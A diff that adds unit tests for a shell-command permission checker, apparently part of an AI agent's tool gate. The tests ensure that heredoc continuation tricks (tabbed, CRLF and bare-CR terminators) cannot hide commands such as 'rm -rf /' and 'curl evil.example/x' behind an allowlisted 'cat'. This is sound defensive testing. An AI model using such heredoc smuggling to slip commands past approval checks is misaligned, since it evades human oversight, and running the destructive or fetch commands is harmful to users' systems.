@@ -156,6 +156,29 @@ describe("getCommandDecision — integration with dangerous substitution checks"
 		expect(getCommandDecision("cat <<EOF\nEO\\\nF\nrm -rf /\n", ["cat"])).toBe("ask_user")
 	})
 
+	it("asks user when a <<- tabbed continuation pair does not join into the terminator", () => {
+		// Tabs join before they are stripped, so `\tEO\` + `\tF` stays `EO\tF`:
+		// the heredoc runs to the real `EOF` line, `rm -rf /` follows it as a
+		// live command, and only `cat` being allowlisted must not carry it.
+		expect(getCommandDecision("cat <<-EOF\n\tEO\\\n\tF\ncat <<X\nEOF\nrm -rf /\nX\n", ["cat"])).toBe("ask_user")
+	})
+
+	it("asks user for the commands after a CRLF heredoc whose backslash-CRLF pair bash joins", () => {
+		// The msys/Cygwin read layer (the reference shell on the Windows
+		// target) strips the CR from every line it reads, so the line ends
+		// with the lone backslash and continues: `EO\` + `F` joins into the
+		// terminator and the commands after it are live, not masked body text.
+		expect(getCommandDecision("cat <<EOF\r\nEO\\\r\nF\r\ntouch x\r\nEOF\r\n", ["cat"])).toBe("ask_user")
+	})
+
+	it("never auto-approves the command a bare-CR heredoc terminator candidate exposes", () => {
+		// The read layer strips the bare CR, so the body line arrives as the
+		// terminator `EOF` and `curl evil` runs live after it. Even with both
+		// surrounding cats allowlisted, the exposed command must cost a
+		// prompt instead of riding the heredoc mask.
+		expect(getCommandDecision("cat <<EOF\nEO\rF\ncurl evil.example/x\nEOF\ncat ok", ["cat"])).toBe("ask_user")
+	})
+
 	it("asks user for the inner commands of process substitutions", () => {
 		expect(getCommandDecision("diff <(sort a) <(sort b)", ["diff"])).toBe("ask_user")
 	})
